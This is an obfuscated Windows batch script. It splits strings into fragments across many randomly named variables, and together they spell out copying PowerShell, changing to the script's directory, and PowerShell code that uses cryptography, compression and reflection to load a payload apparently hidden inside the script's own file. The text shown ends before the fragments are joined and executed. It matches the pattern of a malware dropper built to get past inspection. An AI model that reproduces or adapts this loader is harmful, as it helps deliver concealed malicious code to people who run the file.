@echo off
set "MxfcHTtwKB=we"
set "pqNooluMRj=Sy"
set "frVWBmGPEf=Wi"
set "HzSnkMmizd=\W"
set "dqOgRWfstr= C"
set "aYTHaJbHWS=he"
set "VezrRNHfmc=rS"
set "mQKRimQJWd=0\"
set "bqrxPblKxV=ow"
set "VtjnVKzJKt=po"
set "shcxMwZUbb=ll"
set "lXpDSBdeyE=ws"
set "qTGtkOGCMT=he"
set "HtkZlCSLAT=:\"
set "cvYyhcRQeD=nd"
set "XfwcMqWCOw=rs"
set "ghAujPdZqp= /"
set "aVsJqipGGv=em"
set "KcHXSOayhz=st"
set "NXVntiXjPg=xe"
set "rbBNZHCyBk=y "
set "gQRPQhOwnC=we"
set "xtvugQWgAE=.e"
set "sJoQuORnWZ=ll"
set "tGWWzhILOw=co"
set "OTgrSLvREF=s\"
set "GalynKCdiD=32"
set "clURCSRMRT=1."
set "VghCKJqhUT=Po"
set "LWJeEtYeXg=in"
set "vwKJxHFGlX=py"
set "VNfwCJQiJh=do"
set "hGtWIQHPLW=\v"
set "hAAJqKLwMx=cd"
set "bduKPPpFYd= %~dp0"
set "WXjGHvfSfz=y]::"
set "jwOZZiMzfT=OyzA"
set "TIopDojsWr=);$O"
set "SXvGmhpvBY=yste"
set "obSIHzvYCy=yste"
set "VshuiASVTd=L = "
set "WVsHwZmeKG=N.En"
set "AKZcukOcmX=tS46"
set "DXNfJdZCsn='[-1"
set "slTpdPqINV=[Sys"
set "kqMJawAuPS=ct S"
set "tWwYakzJnb=OcJt"
set "qqkmolTXPJ=flec"
set "OGwBaISBNX=Obje"
set "CxpxHKWNom=esFX"
set "AIzgyHFfVJ=3HWs"
set "bROpLBJnZV=e]::"
set "vYaomfOiNJ=ZYYc"
set "uTPLYCyQGu=F = "
set "ANmuDUaZtK=morF"
set "WCfudgeOgR=se()"
set "YSakvxEiQC=.IO."
set "HidgnohlKj=$gah"
set "UGwQMWmPHI=;$Jq"
set "ZIwHoOdZPs=$xmH"
set "hLfVLkHkMW=cRMg"
set "PRZtDufRcD=; };"
set "dlmyNHOmSd=Secu"
set "BmMBtMgqoX=S46e"
set "kJwydimdNS=ispo"
set "jtntlTRuVh=tgY."
set "MKdLJdSaBb=y.Cr"
set "PUeopIyEqV=nirt"
set "AvBosvDjUK=tion"
set "WkKTFWbmZC=, $x"
set "hkBBrPTFAa=B.Pa"
set "WSnRrwAUwq=saBm"
set "LtgwqCnsnh=('%~f0'"
set "RrwcZldJVr=[-1."
set "drdRRPhNxQ=Obje"
set "VnMQlKKprS=0O+g"
set "NxcCKHzmUQ=jwl."
set "CEyHRiajxY=Comp"
set "bdPKzMLfVR=raph"
set "jteoxWYptH=L) {"
set "HtxqPzvvYi=ahcB"
set "rLyVsyHUmq=comp"
set "zVKQNvcxWj=);$H"
set "rMFiMqMNfH=HkF."
set "RDHSOGIPeg=  $L"
set "CDmfFwzqLa='txe"
set "cgSSnLqiHo=rity"
set "ailiPninhD=$OcJ"
set "vpgcTIflmu=XdUo"
set "lNebbAOiXi=:: '"
set "PKJcovfweC= = ["
set "OaCvDkNUtV=le  "
set "sMBQCdPYUj=m.IO"
set "vwfisdPRzZ=rofi"
set "AHkSxUBswj=ress"
set "cAAqdeurFp= New"
